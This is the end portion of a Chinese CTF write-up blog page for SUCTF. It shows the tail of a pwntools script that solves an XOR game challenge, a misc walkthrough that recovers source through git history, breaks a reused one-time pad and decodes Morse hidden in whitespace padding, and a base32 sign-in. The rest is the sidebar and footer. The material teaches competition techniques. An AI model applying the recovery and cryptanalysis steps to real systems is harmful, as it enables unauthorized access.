(xxor(l) == 0):</span></span><br><span class="line"><span class="string">						q = [d, mx]</span></span><br><span class="line"><span class="string">						break</span></span><br><span class="line"><span class="string">		p.sendline("%d %d" % (q[0], q[1]))</span></span><br><span class="line"><span class="string">		r[q[1]] -= q[0]</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">print "level3 pass"</span></span><br><span class="line"><span class="string">p.interactive()</span></span><br></pre></td></tr></table></figure></p>
<p>// 电脑的策略和这个策略是一样的（也没其他策略啊</p>
<p>打下来得到鬼畜的Flag<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">### Padding的秘密</span><br><span class="line"></span><br><span class="line">#### step 1</span><br><span class="line">下载附件，修改`secret`后缀为`zip`，发现有`.git`。</span><br><span class="line">老招数了，通过`git`回溯版本可以拿到源码`SUcrypto.py`和`key.jpg`</span><br><span class="line">#### step 2</span><br><span class="line">分析源码（后为hint1）可知，为`one-time-pad`(一次性密码本加密)相关漏洞。</span><br><span class="line">一次性密码本多次使用后将存在泄露风险。</span><br><span class="line"></span><br><span class="line">即我们可以通过词频分析（工具请自行上gayhub搜索），获得脚本中的密钥key，和所有的tips（nc上的2选项templates）</span><br><span class="line">此处省略漫长的分析过程。。。。。。</span><br><span class="line"></span><br><span class="line">#### step 3</span><br><span class="line">获得了密钥`key：“FL4G is SUCTF&#123;This_is_the_fake_f14g&#125;,guys”`后，通过nc提交得到新的hint：“嘤嘤嘤，flag不在这里，人家说secret里有、东西”</span><br><span class="line"></span><br><span class="line">&gt; 这里有大师傅在做题过程中提示会有非预期解，是本人的疏忽，深表歉意</span><br><span class="line"></span><br><span class="line">回到`secret`压缩包里有`winrar`注释，一大长串的padding串。转ascii后发现有`09`、`20`、`0D0A`三种字符。结合新hint：有“.”东西，可想到带‘.’的加解密中，最容易想到的摩斯电码。</span><br><span class="line">```code</span><br><span class="line">09   -&gt; .</span><br><span class="line">20   -&gt; -</span><br><span class="line">0D0A -&gt; 空格</span><br></pre></td></tr></table></figure></p>
<p>摩斯电码解密  再hex一下会得到缺了一部分的<code>flag</code>。</p>
<p>结合<code>key.jpg</code>即可获得<code>flag</code>。</p>
<h3 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h3><p>base32编码，直接解码得到Flag</p>

      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      
      
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2018/05/26/MISC心得/" rel="next" title="编码问题">
                <i class="fa fa-chevron-left"></i> 编码问题
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
          </div>
        </div>
      

      
      
    </footer>
  </div>
  
  
  
  </article>



    <div class="post-spread">
      
    </div>
  </div>


          </div>
          


          

  



        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            Table of Contents
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
            Overview
          </li>
        </ul>
      

      <section class="site-overview-wrap sidebar-panel">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">John Doe</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">9</span>
                  <span class="site-state-item-name">posts</span>
                </a>
              </div>
            

            

            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUCTF-WriteUp-全题目"><span class="nav-number">1.</span> <span class="nav-text">SUCTF WriteUp 全题目</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#WEB"><span class="nav-number">1.1.</span> <span class="nav-text">WEB</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Anonymous"><span class="nav-number">1.1.1.</span> <span class="nav-text">Anonymous</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Getshell"><span class="nav-number">1.1.2.</span> <span class="nav-text">Getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#注意问题"><span class="nav-number">1.1.2.1.</span> <span class="nav-text">注意问题</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#MultiSql"><span class="nav-number">1.1.3.</span> <span class="nav-text">MultiSql</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Homework"><span class="nav-number">1.1.4.</span> <span class="nav-text">Homework</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#HateIT"><span class="nav-number">1.1.5.</span> <span class="nav-text">HateIT</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Reverse"><span class="nav-number">1.2.</span> <span class="nav-text">Reverse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#babyre"><span class="nav-number">1.2.1.</span> <span class="nav-text">babyre</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#simpleformat"><span class="nav-number">1.2.2.</span> <span class="nav-text">simpleformat</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enigma"><span class="nav-number">1.2.3.</span> <span class="nav-text">Enigma</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#RubberDucky-天枢-选手-Invicsfate"><span class="nav-number">1.2.4.</span> <span class="nav-text">RubberDucky[天枢][选手:Invicsfate]</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Pwn"><span class="nav-number">1.3.</span> <span class="nav-text">Pwn</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap"><span class="nav-number">1.3.1.</span> <span class="nav-text">Heap</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#lock"><span class="nav-number">1.3.2.</span> <span class="nav-text">lock</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Note"><span class="nav-number">1.3.3.</span> <span class="nav-text">Note</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heapprint"><span class="nav-number">1.3.4.</span> <span class="nav-text">Heapprint</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Program-info"><span class="nav-number">1.3.4.1.</span> <span class="nav-text">Program info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bug"><span class="nav-number">1.3.4.2.</span> <span class="nav-text">Bug</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit"><span class="nav-number">1.3.4.3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#The-Final-Script"><span class="nav-number">1.3.4.4.</span> <span class="nav-text">The Final Script</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Noend"><span class="nav-number">1.3.5.</span> <span class="nav-text">Noend</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Program-info-1"><span class="nav-number">1.3.5.1.</span> <span class="nav-text">Program info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Bug-1"><span class="nav-number">1.3.5.2.</span> <span class="nav-text">Bug</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Exploit-1"><span class="nav-number">1.3.5.3.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Final-Script"><span class="nav-number">1.3.5.4.</span> <span class="nav-text">Final Script</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Crypto"><span class="nav-number">1.4.</span> <span class="nav-text">Crypto</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Magic"><span class="nav-number">1.4.1.</span> <span class="nav-text">Magic</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Pass"><span class="nav-number">1.4.2.</span> <span class="nav-text">Pass</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Enjoy"><span class="nav-number">1.4.3.</span> <span class="nav-text">Enjoy</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rsa"><span class="nav-number">1.4.4.</span> <span class="nav-text">Rsa</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Rsa-good"><span class="nav-number">1.4.5.</span> <span class="nav-text">Rsa good</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Misc"><span class="nav-number">1.5.</span> <span class="nav-text">Misc</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#game"><span class="nav-number">1.5.1.</span> <span class="nav-text">game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Cycle"><span class="nav-number">1.5.2.</span> <span class="nav-text">Cycle</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#TNT"><span class="nav-number">1.5.3.</span> <span class="nav-text">TNT</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#step-1"><span class="nav-number">1.5.3.1.</span> <span class="nav-text">step 1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#step-2"><span class="nav-number">1.5.3.2.</span> <span class="nav-text">step 2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#step-3"><span class="nav-number">1.5.3.3.</span> <span class="nav-text">step 3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#step-4"><span class="nav-number">1.5.3.4.</span> <span class="nav-text">step 4</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Game"><span class="nav-number">1.5.4.</span> <span class="nav-text">Game</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#签到"><span class="nav-number">1.5.5.</span> <span class="nav-text">签到</span></a></li></ol></li></ol></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">John Doe</span>

  
</div>


  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
